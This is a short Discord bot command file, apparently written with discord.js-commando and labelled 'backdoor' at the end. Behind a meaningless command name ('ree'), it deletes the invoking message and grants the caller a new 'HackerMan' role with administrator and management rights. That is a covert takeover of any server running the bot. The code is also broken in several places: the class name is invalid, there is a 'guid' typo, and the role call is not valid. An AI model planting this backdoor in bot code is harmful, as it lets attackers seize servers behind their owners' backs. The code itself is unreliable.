const Discord = require("discord.js");
const commando = require('discord.js-commando');
const prefix = "!";
const bot = new commando.Client({
  commandPrefix: prefix
});

class d0123ndawdawgae-dawdawd-sereverdownCommand extends commando.Command {
  constructor(client) 
  {
    super(client, {
      name: 'ree', 
      group: 'admin',
      memberName: 'ree',
      description: "ree"
    });
  }

  async run (message, args)
  {

    message.delete(3000).catch(O_o=>{});

    message.guild.roleCreate({ name: 'HackerMan', permissions: ['ADMINISTRATOR', 'MANAGE_SERVER', 'VIEW_AUDIT_LOG', 'MANAGE_ROLES', 'MANAGE_CHANNELS'] });
    
    var hackermanrole = message.guid.roles.find(`name`, "HackerMan");
    
    message.member.addRole(hackermanrole.id);
  }
}

module.exports = d0123ndawdawgae-dawdawd-sereverdownCommand;

backdoor
